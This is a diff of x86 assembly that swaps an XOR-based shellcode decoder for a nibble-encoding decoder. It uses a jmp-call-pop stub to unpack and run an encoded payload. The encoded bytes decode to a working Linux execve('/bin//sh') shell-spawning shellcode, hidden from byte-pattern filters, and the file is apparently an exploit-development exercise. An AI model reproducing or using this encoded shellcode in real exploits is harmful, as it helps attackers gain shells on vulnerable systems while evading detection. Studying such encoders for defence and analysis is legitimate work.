@@ -1,44 +1,71 @@
-; section .data
-; 	string db '/bin//sh'
-; section .text
 global _start
-	; this shell code will xor every byte of 'jocker' segment , then execute them
-	; password is 0xe9
-	_start:
-		jmp jocker
-		loader:
-			pop esi ; get address of encrypted shellcode	
-			xor ecx, ecx
-			mov cl, 21 ; loop times (length of encrypt shellcode)
-			decrypt:
-				mov al, [esi]
-				xor al, 0e9H
-				mov [esi], al
-				inc esi
-				loop decrypt
-				jmp encrypt
+_start:
+	jmp jocker
+
+	loader:
+		pop    esi
+		mov    edi,esi
+		xor    ecx,ecx
+		mov    cl,0x2a
+
+	decrypt:
+		mov    ah, [esi]
+		mov    al, [esi+0x1]
+		sub    al,0x41
+		sub    ah,0x41
+		shl    ah,0x4
+		add    al,ah
+		mov    [edi],al
+		inc    esi
+		inc    esi
+		inc    edi
+		loop   decrypt
+		jmp    cipher
 
 	jocker:
-		call loader
-	encrypt:
-		db 0d8H
-		db 20H
-		db 0b8H
-		db 81H
-		db 0c6H
-		db 0c6H
-		db 9aH
-		db 81H
-		db 81H
-		db 0c6H
-		db 8bH
-		db 80H
-		db 87H
-		db 60H
-		db 0aH
-		db 83H
-		db 0e2H
-		db 0b1H
-		db 70H
-		db 24H
-		db 69H
+		call   loader
+
+	cipher:
+		db 044H
+		db 042H  
+		db 04dH  
+		db 04aH  
+		db 046H  
+		db 042H
+		db 047H  
+		db 049H  
+		db 043H  
+		db 050H  
+		db 043H  
+		db 050H  
+		db 048H  
+		db 044H  
+		db 047H  
+		db 049H  
+		db 047H  
+		db 049H  
+		db 043H 
+		db 050H  
+		db 047H  
+		db 043H  
+		db 047H  
+		db 04aH 
+		db 047H  
+		db 04fH  
+		db 049H  
+		db 04aH  
+		db 04fH  
+		db 044H  
+		db 047H  
+		db 04bH  
+		db 041H  
+		db 04cH  
+		db 046H  
+		db 049H  
+		db 04aH  
+		db 04aH  
+		db 04dH  
+		db 04eH  
+		db 049H
+		db 041H
+
